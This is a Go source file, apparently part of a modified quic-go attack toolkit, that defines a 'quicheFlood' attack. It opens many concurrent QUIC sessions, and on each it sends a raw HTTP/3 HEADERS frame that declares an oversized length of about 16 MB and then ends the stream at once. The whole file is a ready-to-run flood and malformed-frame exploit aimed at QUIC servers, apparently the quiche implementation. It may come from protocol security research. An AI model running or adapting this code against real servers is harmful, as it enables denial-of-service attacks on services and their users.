package main

import (
	"bytes"
	"encoding/binary"
	"log"
	"sync"
	"time"

	"github.com/k4ra5u/quic-go/internal/protocol"
	"github.com/k4ra5u/quic-go/internal/wire"
)

type quicheFlood struct {
	BaseArgs
}

func (quicheFlood *quicheFlood) Attack() (response *HTTPMessage, err error) {
	var wg sync.WaitGroup
	for i := 0; uint64(i) < quicheFlood.repeatTimes; i++ {
		wg.Add(1)

		go func(id int) {
			_, err = quicheFlood.attack_once()
			wg.Done()
			if err != nil {
				log.Printf("Error: %#v", err)
			}
		}(i)
		time.Sleep(time.Millisecond * 2)

	}
	wg.Wait()
	return nil, err

}

func (quicheFlood *quicheFlood) attack_once() (response *HTTPMessage, err error) {
	session, cancel, err := quicheFlood.Make_one_session()
	defer func() {
		_ = session.CloseWithError(0, "")
		cancel()
	}()

	requestStream, err := session.OpenStream()
	if err != nil {
		return nil, err
	}

	firstRange := bytes.NewBuffer(nil)
	firstRange.Write([]byte("\x01"))
	header_size := (uint64)(0xffffff)
	qpack_header_size := 3<<62 + header_size
	buf_header_size := new(bytes.Buffer)
	binary.Write(buf_header_size, binary.BigEndian, qpack_header_size)
	firstRange.Write(buf_header_size.Bytes())

	firgeFrame := &wire.StreamFrame{
		StreamID:       0,
		Offset:         protocol.ByteCount(0),
		Data:           firstRange.Bytes(),
		Fin:            true,
		DataLenPresent: true,
	}
	first_frame := []wire.Frame{
		firgeFrame,
	}
	requestStream.(interface{ SendFramesDirect([]wire.Frame) }).SendFramesDirect(first_frame)

	log.Printf("header of HEADERS finished")
	return nil, nil
}
